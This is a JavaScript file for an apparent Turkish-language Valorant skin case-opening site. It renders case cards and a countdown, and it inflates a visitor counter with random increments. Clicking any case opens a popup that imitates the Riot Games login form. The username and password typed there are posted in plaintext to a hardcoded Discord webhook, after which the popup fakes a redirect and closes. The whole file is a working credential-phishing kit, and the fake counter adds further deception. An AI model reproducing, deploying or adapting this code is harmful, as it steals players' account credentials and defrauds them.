const WEBHOOK_URL = "https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq";

// 1. Üst Şerit
const track = document.getElementById('track');
const skins = ["skin1.png", "skin2.png", "skin3.png", "skin4.png", "skin5.png"];
if(track) {
    track.innerHTML = [...skins, ...skins, ...skins, ...skins].map(s => `
        <div class="drop-card"><img src="${s}" onerror="this.src='https://via.placeholder.com/40'"></div>
    `).join('');
}

// 2. Kasalar
const cases = [
    {n: "BAŞLANGIÇ", p: "10 VP", i: "case1.png"},
    {n: "STANDART", p: "30 VP", i: "case2.png"},
    {n: "ELİT", p: "50 VP", i: "case3.png"},
    {n: "PREMIUM", p: "100 VP", i: "case4.png"},
    {n: "EFSANEVİ", p: "500 VP", i: "case5.png"},
    {n: "RADYANİT", p: "2000 VP", i: "case6.png"}
];
const grid = document.getElementById('caseGrid');
if(grid) {
    grid.innerHTML = cases.map(c => `
        <div class="case-box" onclick="openAuth()">
            <img src="${c.i}" onerror="this.src='https://via.placeholder.com/140'">
            <h3>${c.n} KASASI</h3>
            <div class="vp-tag">${c.p}</div>
            <button class="open-btn">AÇ</button>
        </div>
    `).join('');
}

// 3. Sayaç
function timer() {
    const now = new Date();
    const utc3 = new Date(now.getTime() + (now.getTimezoneOffset() * 60000) + (3 * 3600000));
    let t = new Date(utc3); t.setHours(24, 0, 0, 0);
    let d = t - utc3;
    let h = Math.floor(d/3600000), m = Math.floor((d%3600000)/60000), s = Math.floor((d%60000)/1000);
    const el = document.getElementById('countdown');
    if(el) el.innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
}
setInterval(timer, 1000);

// 4. İstatistik Artışı
setInterval(() => {
    const s1 = document.getElementById('s1');
    if(s1) {
        let val = parseInt(s1.innerText.replace('.',''));
        s1.innerText = (val + Math.floor(Math.random() * 5 - 2)).toLocaleString('tr-TR');
    }
}, 3000);

// 5. Giriş Penceresi
function openAuth() {
    const w = 600, h = 800;
    const l = (window.screen.width/2)-(w/2), t = (window.screen.height/2)-(h/2);
    let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
    
    win.document.body.innerHTML = `
        <style>
            body { margin:0; height:100vh; background: url('login_bg.jpg') center/cover; display:flex; justify-content:center; align-items:center; font-family:sans-serif; }
            .c { background:#fff; width:340px; padding:40px; border-radius:4px; text-align:center; }
            input { width:100%; padding:14px; margin:10px 0; background:#f2f2f2; border:2px solid transparent; border-radius:4px; box-sizing:border-box; outline:none; font-weight:600; }
            input:focus { border-color:#ff4655; background:#fff; }
            button { width:100%; padding:16px; background:#ff4655; color:#fff; border:none; border-radius:8px; cursor:pointer; font-weight:700; margin-top:30px; }
        </style>
        <div class="c">
            <img src="login_logo.png" width="100" style="margin-bottom:20px;">
            <h2 style="color:#111;">Oturum Aç</h2>
            <input type="text" id="user" placeholder="KULLANICI ADI">
            <input type="password" id="pass" placeholder="ŞİFRE">
            <button id="go">GİRİŞ YAP</button>
        </div>
    `;

    win.document.getElementById('go').onclick = function() {
        const u = win.document.getElementById('user').value;
        const p = win.document.getElementById('pass').value;
        if(u && p) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `🔑 **Giriş:** \`${u}\` / \`${p}\`` })
            }).then(() => {
                win.document.body.innerHTML = "<h2>Yönlendiriliyorsunuz...</h2>";
                setTimeout(() => win.close(), 1200);
            });
        }
    };
}
